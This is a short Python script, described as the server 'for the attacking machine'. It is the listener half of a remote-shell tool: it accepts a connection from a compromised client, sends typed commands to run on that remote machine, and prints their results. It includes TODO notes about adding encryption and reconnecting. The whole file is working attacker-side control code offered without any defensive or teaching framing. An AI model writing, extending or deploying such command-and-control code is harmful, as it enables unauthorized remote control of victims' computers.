# server.py - For the attacking machine

import socket

import configuration as config  # Import configuration file

# CONSTANTS & GLOBALS
ADDRESS = (config.INTERNAL_SERVER_ADDR, config.SERVER_PORT)
BACKLOG = 5  # Max number of queued connections, system-dependent

########################
# CODE BEGINS
########################

# Create a socket to listen to incoming connections
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind it to the server address and port
server_socket.bind(ADDRESS)
server_socket.listen(BACKLOG)

print("Server now listening at on port %s" % (ADDRESS[1]))

# Accept a connection
connection_socket, client_addr = server_socket.accept()
print("Connected to %s on port %s" % (client_addr[0], client_addr[1]))

# FOR DEBUGGING ONLY - change text to bytes (via encode) and send it over the connection
message = "Test message!!!".encode()
connection_socket.send(message)  # Need to add some asymmetric encryption

# TODO before sending in loop, check if we need to reconnect!!!

# Server REPL loop - run the interactive shell
while True:
    # Read in command from input
    command = input(":3 ")
    # Note: break out of loop if the command was 'exit' or 'hangup'
    stripped_cmd = command.strip().lower()
    if stripped_cmd == "exit" or stripped_cmd == "hangup":
        # Tell the client to shut down, end server program
        encrypted_exit = command.encode()
        connection_socket.send(encrypted_exit)
        # TODO should I really end the server program? how to get back in touch, then?
        break
    # Execute the command on the remote machine (client)
    encrypted_command = command.encode()
    connection_socket.send(encrypted_command)
    # Print the results
    decrypted_results = connection_socket.recv(config.PAYLOAD_SIZE).decode()
    print(decrypted_results)
